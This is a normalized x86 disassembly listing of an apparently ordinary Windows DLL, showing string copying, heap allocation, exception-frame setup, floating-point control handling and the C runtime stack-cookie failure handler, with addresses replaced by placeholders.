cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_10016570
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
movzx eax [ eax ]
add esp 0xc
push ebx
push 0x0
push eax
call sub_10030ff0
mov [ esi + 0xc ] ax
mov eax [ edi + 0x18 ]
movzx eax [ eax ]
push ebx
push 0x0
push eax
call sub_10030ff0
add esp 0x18
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xe ] ax
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
js r-xdata
call sub_10008d33
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_1007f580
push 0x4
push esi
push [ ebp - 0x14 ]
call sub_1007f580
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_100676d2
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp - 0x14 ] eax
call sub_100676d2
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_1000a790
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_100448ba
mov [ esi ] al
inc esi
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_1000a7c0
push 0x38
mov eax sub_100852a6
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1006406d
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10046885
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_1002be90
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_1000a880
push ebp
mov ebp esp
push 0xffffffff
push sub_1008697e
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push 0xffffffff
xor ebx ebx
push ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] ax
call sub_1002d970
push 0xffffffff
lea ecx [ esi + 0x1c ]
mov [ ebp - 0x4 ] ebx
push ebx
lea eax [ edi + 0x1c ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_1002d970
mov [ ebp - 0x4 ] 0x1
mov cx [ edi + 0x38 ]
mov [ esi + 0x38 ] cx
push 0xffffffff
lea ecx [ esi + 0x3c ]
push ebx
lea eax [ edi + 0x3c ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_1002d970
push 0xffffffff
lea ecx [ esi + 0x58 ]
mov [ ebp - 0x4 ] 0x2
push ebx
lea eax [ edi + 0x58 ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_1002d970
mov cl [ edi + 0x74 ]
mov [ esi + 0x74 ] cl
mov edx [ edi + 0x78 ]
mov [ esi + 0x78 ] edx
mov eax [ edi + 0x7c ]
mov [ esi + 0x7c ] eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1000a957
push 0x10
push r--data
call sub_1007fad0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1003a6bb
and [ eax ] 0x0
call sub_1005b670
mov [ eax ] 0x9
call sub_1003a6bb
and [ eax ] 0x0
call sub_1005b670
mov [ eax ] 0x9
cmp ebx [ rw-data ]
jb r-xdata
call sub_1007fb15
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push ebx
call sub_1005fd8b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1003a6bb
and [ eax ] 0x0
call sub_1005b670
mov [ eax ] 0x16
jmp r-xdata
call sub_1005b670
mov [ eax ] 0x9
call sub_1003a6bb
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_10037514
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_1004b131
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000aa45
mov eax [ ebp - 0x1c ]
sub_1000aa4d
push 0x3c
mov eax sub_100855ee
call sub_10047689
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ ebp - 0x24 ] 0x0
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x3c ] eax
movsb [ edi ] [ esi ]
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x34 ] 0x0
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push eax
push ebx
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x24 ]
push ecx
call sub_1004ad03
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] 0x10
and [ ebp - 0x48 ] 0x0
mov eax [ ebp - 0x34 ]
dec esi
cmp [ ebp - 0x20 ] 0x10
jae r-xdata
mov eax [ ebp - 0x38 ]
add eax eax
mov [ ebp - 0x38 ] eax
jmp r-xdata
lea ebx [ eax + 0x1 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x34 ]
push 0x0
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x34 ]
call sub_10042a70
cmp [ ebp - 0x20 ] 0x10
mov edi [ ebp - 0x44 ]
mov eax [ edi + 0x8 ]
mov ecx [ ebp - 0x34 ]
jae r-xdata
mov eax [ ebp + 0xc ]
mov esi [ ebp - 0x3c ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ esi + 0x4 ] eax
call sub_10005b50
mov eax esi
call sub_100262c3
retn 0x20
add edi 0xc
xor eax eax
jle r-xdata
push edi
lea eax [ ebp - 0x48 ]
push eax
push esi
lea eax [ ebp - 0x40 ]
push ebx
push eax
call sub_10025a12
add esp 0x14
cmp eax 0xfffffffd
je r-xdata
push [ ebp - 0x40 ]
lea ecx [ ebp + 0xc ]
sub esi eax
add ebx eax
call sub_100650d7
test esi esi
jne r-xdata
test eax eax
js r-xdata
jne r-xdata
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
push ebx
call sub_1007fa40
pop ecx
inc eax
jmp r-xdata
sub_1000ab70
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x3c ] 0x8
push edi
jb r-xdata
xor ecx ecx
mov [ esi + 0x3c ] 0x7
mov [ esi + 0x38 ] 0x0
mov [ esi + 0x28 ] cx
cmp [ esi + 0x20 ] 0x10
jb r-xdata
mov eax [ esi + 0x28 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] 0x0
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
mov edx [ esi + 0xc ]
push edx
call sub_1000a86e
add esp 0x4
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1000c927
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4 ]
not esi
call sub_10003c9c
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_1000ac10
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0xc ]
cmp ecx 0xffffffff
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0x10 ]
add [ esi ] eax
add [ esi + 0x1c ] eax
push edi
mov edi [ esi ]
cmp ecx 0xa
jne r-xdata
cmp ecx 0x9
jne r-xdata
mov eax 0x1
add [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
jmp r-xdata
inc [ esi + 0x18 ]
mov eax [ esi + 0x2c ]
mov ecx [ eax ]
mov ecx [ ecx + 0xc ]
mov eax [ esi + 0x18 ]
xor edx edx
div ecx
inc eax
imul eax ecx
mov [ esi + 0x18 ] eax
jmp r-xdata
cmp edi [ esi + 0x8 ]
pop edi
jae r-xdata
mov [ esi + 0xc ] 0xffffffff
call sub_1007e620
pop esi
pop ebp
retn
sub_1000ac90
push ebp
mov ebp esp
push 0xffffffff
push sub_100861c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x28 ] esi
call sub_1003d7d5
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x24 ] eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
cmp [ ebp + 0xc ] bl
je r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x18 ] r--data
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
lea edi [ eax + 0x1 ]
push edi
call sub_1002b2d3
add esp 0x4
mov [ ebp - 0x1c ] eax
mov ecx eax
nop
call sub_100575c5
mov eax [ ebp - 0x18 ]
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0x1c ]
mov [ esi + 0x8 ] ecx
call sub_100575c5
mov [ ebp - 0x1c ] edx
lea edx [ ebp - 0x20 ]
push edx
push ebx
push r--data
mov [ ebp - 0x20 ] eax
call sub_10016570
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_100575c5
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push r--data
mov [ ebp - 0x1c ] edx
call sub_10016570
add esp 0xc
mov [ esi + 0x14 ] eax
call sub_100575c5
mov edi [ ebp - 0x24 ]
mov ecx [ edi ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edx
mov dl [ ecx ]
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x24 ]
push ecx
mov [ ebp - 0x14 ] dl
push 0x1
lea edx [ ebp - 0x14 ]
push edx
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x24 ] ebx
call sub_10025a12
mov cx [ ebp - 0x18 ]
add esp 0x14
mov [ esi + 0xc ] cx
call sub_100575c5
mov [ ebp - 0x28 ] edx
mov edx [ edi + 0x4 ]
mov [ ebp - 0x2c ] eax
mov al [ edx ]
lea ecx [ ebp - 0x2c ]
push ecx
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x14 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
push ecx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x24 ] ebx
call sub_10025a12
mov dx [ ebp - 0x18 ]
add esp 0x14
mov [ esi + 0xe ] dx
cmp [ ebp + 0xc ] bl
je r-xdata
mov edx [ ebp - 0x18 ]
mov al [ edx ]
mov [ ecx ] al
dec edi
inc ecx
inc edx
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_100575c5
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x24 ]
push ecx
mov [ ebp - 0x28 ] edx
push 0x1
lea edx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp + 0xc ] 0x2e
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x24 ] ebx
call sub_10025a12
mov cx [ ebp - 0x18 ]
add esp 0x14
mov [ esi + 0xc ] cx
call sub_100575c5
mov [ ebp - 0x28 ] edx
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x1
lea ecx [ ebp + 0xc ]
push ecx
lea edx [ ebp - 0x18 ]
push edx
mov [ ebp + 0xc ] 0x2c
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x24 ] ebx
call sub_10025a12
mov ax [ ebp - 0x18 ]
add esp 0x14
mov [ esi + 0xe ] ax
cmp edi ebx
jbe r-xdata
sub_1000ae80
push ebp
mov ebp esp
sub esp 0x8
mov al [ ebp + 0x8 ]
add ecx 0x18
push ecx
lea ecx [ ebp - 0x8 ]
push ecx
push 0x1
lea edx [ ebp + 0x8 ]
mov [ ebp + 0x8 ] al
push edx
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x8 ] 0x0
call sub_10025a12
add esp 0x14
test eax eax
mov eax 0xffff
js r-xdata
mov esp ebp
pop ebp
retn 0x4
movzx eax [ ebp - 0x4 ]
sub_1000aed0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push 0xffffffff
mov esi ecx
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov [ esi ] 0x0
call sub_10037cf0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1000af00
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x15 ] 0x0
mov esi ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
pop edi
pop esi
pop ebx
retn
mov ecx [ esi + 0x8 ]
push ecx
mov ecx edi
call sub_100293b0
mov esi [ esi ]
push ebx
call sub_1000a86e
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
sub_1000af4f
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_1006ad26
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_1006ad26
pop ecx
sub_1000b055
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x4 ]
mov bx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_10083af5
movzx eax ax
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_10083b83
push eax
mov [ ebp - 0xc ] eax
call sub_100207bd
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_1000b388
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx ] 0x0
push edi
mov edi eax
je r-xdata
pop edi
pop ebx
pop ebp
retn
movzx ecx [ eax ]
test cx cx
je r-xdata
xor eax eax
mov edx ecx
sub eax ebx
cmp [ ecx ] 0x0
je r-xdata
movzx edx [ ecx ]
test dx dx
je r-xdata
mov eax edi
jmp r-xdata
add edi 0x2
movzx edx [ edi ]
add eax 0x2
test dx dx
jne r-xdata
movzx ebx [ eax + ecx ]
sub ebx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test dx dx
je r-xdata
add ecx 0x2
cmp [ eax + ecx ] bx
jne r-xdata
sub_1000b3f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086788
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
xor edi edi
push 0x4
mov [ ebx ] edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0xc ] edi
mov [ ebx + 0x10 ] edi
mov [ ebx + 0x14 ] edi
push edi
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x50 ] eax
mov [ ebx + 0x18 ] edi
mov [ ebx + 0x1c ] edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ ebx + 0x1c ] eax
inc [ eax ]
lea esi [ ebx + 0x20 ]
push 0x4
mov [ ebp - 0x4 ] edi
push edi
mov [ ebp - 0x7c ] esi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x4 ] eax
inc [ eax ]
mov esi [ GetProcessHeap@IAT ]
push 0x4
push edi
mov [ ebx + 0x28 ] edi
mov [ ebx + 0x2c ] edi
call esi
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ ebx + 0x2c ] eax
inc [ eax ]
push 0x4
push edi
mov [ ebx + 0x30 ] edi
mov [ ebx + 0x34 ] edi
call esi
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ ebx + 0x34 ] eax
inc [ eax ]
push 0x4
push edi
mov [ ebx + 0x38 ] edi
mov [ ebx + 0x3c ] edi
call esi
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0x131
call sub_1002f620
mov eax [ ebx + 0x4 ]
cmp eax edi
je r-xdata
mov [ ebx + 0x3c ] eax
inc [ eax ]
mov eax [ ebp - 0x50 ]
mov ecx [ eax ]
mov [ ebx ] ecx
mov esi [ eax + 0x4 ]
cmp esi edi
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x69
call sub_1002f620
mov ecx [ ebx + 0xc ]
cmp ecx edi
je r-xdata
push esi
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x48 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov edx [ ebp - 0x48 ]
push edx
push esi
push eax
mov [ ebx + 0x4 ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x14 ] edi
mov esi [ esi + 0x14 ]
cmp esi 0x6
ja r-xdata
mov ecx [ ebx + 0x10 ]
cmp ecx edi
je r-xdata
push eax
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea ecx [ esi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov edx [ ebp - 0x48 ]
push esi
push edx
push eax
mov [ ebx + 0xc ] eax
call sub_1007f580
mov esi [ ebp - 0x50 ]
add esp 0xc
jmp r-xdata
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x48 ]
mov [ ebx + 0xc ] edi
mov esi [ ebp - 0x50 ]
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0xc ]
mov [ ebp - 0x48 ] eax
cmp eax edi
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x68
call sub_1002f620
mov [ ebx + 0x14 ] esi
jmp r-xdata
push eax
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x48 ]
push esi
push ecx
push eax
mov [ ebx + 0x10 ] eax
call sub_1007f580
mov esi [ ebp - 0x50 ]
add esp 0xc
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x48 ]
mov [ ebx + 0x10 ] edi
mov eax [ esi + 0x10 ]
mov [ ebp - 0x48 ] eax
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
push 0x4
push edi
mov [ ebp - 0x4c ] edi
call [ GetProcessHeap@IAT ]
mov esi [ HeapAlloc@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
inc [ eax ]
mov [ ebp - 0x48 ] eax
push 0x4
push edi
mov [ ebp - 0x5c ] edi
call [ GetProcessHeap@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
inc [ eax ]
mov [ ebp - 0x58 ] eax
push 0x4
push edi
mov [ ebp - 0x64 ] edi
call [ GetProcessHeap@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
inc [ eax ]
mov [ ebp - 0x60 ] eax
push 0x4
push edi
mov [ ebp - 0x6c ] edi
call [ GetProcessHeap@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
inc [ eax ]
mov [ ebp - 0x68 ] eax
push 0x4
push edi
mov [ ebp - 0x74 ] edi
call [ GetProcessHeap@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x68
call sub_1002f620
jmp r-xdata
jmp [ eax * 4 + jump_table_1000b960 ]
inc [ eax ]
mov [ ebp - 0x70 ] eax
mov eax [ ebx + 0x14 ]
cmp eax 0x6
ja r-xdata
mov [ ebp - 0x4 ] 0x8
mov esi [ ebp - 0x70 ]
dec [ esi ]
cmp [ esi ] edi
jne r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0xfb
call sub_1002f620
jmp r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x54 ]
call sub_1005c910
push eax
lea edi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xa
call sub_10016630
mov edi esi
mov [ ebp - 0x4 ] 0x9
call sub_10046710
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x84 ]
call sub_10027750
mov ebx eax
